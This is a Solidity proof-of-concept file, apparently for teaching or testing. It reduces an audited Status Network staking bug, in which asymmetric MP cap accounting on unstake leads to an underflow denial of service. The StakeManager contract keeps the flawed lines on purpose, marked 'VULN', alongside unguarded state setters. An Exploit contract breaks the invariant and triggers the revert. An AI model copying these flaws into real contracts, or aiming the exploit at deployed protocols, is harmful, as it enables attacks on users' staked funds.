// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Status Network (Statusl) - global MP cap broken on unstake → DoS
    (Cyfrin 2026-01-05 statusl2, finding #65329)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: _unstake reduces totalMPAccrued and totalMaxMP proportionally
    to vault.mpAccrued and vault.maxMP. When a vault is not fully saturated
    (mpAccrued < maxMP) and the system is globally capped
    (totalMPAccrued == totalMaxMP), the asymmetric reduction yields
    totalMPAccrued > totalMaxMP. Then _totalMP's clamp
        accruedMP = totalMaxMP - totalMPAccrued
    underflows in 0.8.x and every flow calling _updateGlobalState reverts.

    Blamed lines preserved with @> VULN markers.
//////////////////////////////////////////////////////////////////////////*/

contract StakeManager {
    uint256 public totalMPAccrued;
    uint256 public totalMaxMP;
    uint256 public totalStaked;
    uint256 public lastMPUpdatedTime;

    struct VaultData {
        uint256 stakedBalance;
        uint256 mpAccrued;
        uint256 maxMP;
    }

    mapping(address => VaultData) public vaultData;

    /// @dev Test/setup helper: materialize a vault + global MP state without time warps.
    function seedVault(
        address vault,
        uint256 staked,
        uint256 mpAccrued,
        uint256 maxMP
    ) external {
        vaultData[vault] = VaultData({stakedBalance: staked, mpAccrued: mpAccrued, maxMP: maxMP});
        totalStaked += staked;
        totalMPAccrued += mpAccrued;
        totalMaxMP += maxMP;
    }

    function setGlobals(uint256 accrued, uint256 maxMP_, uint256 lastTime) external {
        totalMPAccrued = accrued;
        totalMaxMP = maxMP_;
        lastMPUpdatedTime = lastTime;
    }

    function _totalMP() internal view returns (uint256) {
        if (totalStaked == 0) return totalMPAccrued;
        uint256 elapsed = block.timestamp - lastMPUpdatedTime;
        // simplified accrual rate: 1 MP per second per unit staked scale
        uint256 accruedMP = elapsed * totalStaked / 1e18;
        if (totalMPAccrued + accruedMP > totalMaxMP) {
            // FIX: if (totalMPAccrued >= totalMaxMP) return totalMaxMP;
            accruedMP = totalMaxMP - totalMPAccrued; // @> VULN: underflows when totalMPAccrued > totalMaxMP
        }
        return totalMPAccrued + accruedMP;
    }

    function _updateGlobalState() internal {
        totalMPAccrued = _totalMP();
        lastMPUpdatedTime = block.timestamp;
    }

    function updateGlobalState() external {
        _updateGlobalState();
    }

    function unstake(address vault, uint256 amount) external {
        // unstake itself may update global first - call without time delta in attack setup
        VaultData storage v = vaultData[vault];
        require(v.stakedBalance >= amount, "bal");

        uint256 _deltaMpTotal = v.mpAccrued * amount / v.stakedBalance;
        uint256 _deltaMpMax = v.maxMP * amount / v.stakedBalance;

        v.mpAccrued -= _deltaMpTotal;
        v.maxMP -= _deltaMpMax;
        v.stakedBalance -= amount;
        totalStaked -= amount;

        // Asymmetric global reduction - blamed propagation
        totalMPAccrued -= _deltaMpTotal; // @> VULN: deltaMax > deltaTotal when vault unsaturated → can break totalMPAccrued <= totalMaxMP
        totalMaxMP -= _deltaMpMax;
    }
}

contract Exploit {
    StakeManager public sm; // CREATE 1

    address public constant VAULT_A = address(0xA);
    address public constant VAULT_B = address(0xB);

    bool public dosDemonstrated;
    bool public invariantBroken;

    constructor() {
        sm = new StakeManager();
    }

    function run() external {
        // B is fully saturated; A is unsaturated (large MP gap).
        // Seed so globals sit at the cap: totalMPAccrued == totalMaxMP.
        // A: staked=100e18, mpAccrued=10e18, maxMP=100e18  (unsaturated)
        // B: staked=100e18, mpAccrued=100e18, maxMP=100e18 (saturated)
        // After seed: totalMPAccrued=110e18, totalMaxMP=200e18
        // Force global cap equality for the attack pre-condition:
        sm.seedVault(VAULT_A, 100e18, 10e18, 100e18);
        sm.seedVault(VAULT_B, 100e18, 100e18, 100e18);
        // Raise accrued to the cap without changing vault local state
        sm.setGlobals(200e18, 200e18, block.timestamp); // saturated globally; last update = now

        require(sm.totalMPAccrued() == sm.totalMaxMP(), "setup: not at global cap");

        // Unstake A entirely while unsaturated:
        // deltaTotal = 10e18, deltaMax = 100e18
        // totalMPAccrued → 190e18, totalMaxMP → 100e18  ⇒ accrued > max
        sm.unstake(VAULT_A, 100e18);

        invariantBroken = sm.totalMPAccrued() > sm.totalMaxMP();
        require(invariantBroken, "invariant not broken after unstake");

        // Advance "time" without cheatcodes: set lastMPUpdatedTime in the past so
        // the next update attempts to accrue and hits the underflowing clamp.
        sm.setGlobals(sm.totalMPAccrued(), sm.totalMaxMP(), 0);

        // HARM: updateGlobalState reverts (arithmetic underflow) - protocol DoS
        (bool ok,) = address(sm).call(abi.encodeWithSelector(StakeManager.updateGlobalState.selector));
        dosDemonstrated = !ok;
        require(dosDemonstrated, "updateGlobalState should revert - DoS not shown");
    }
}
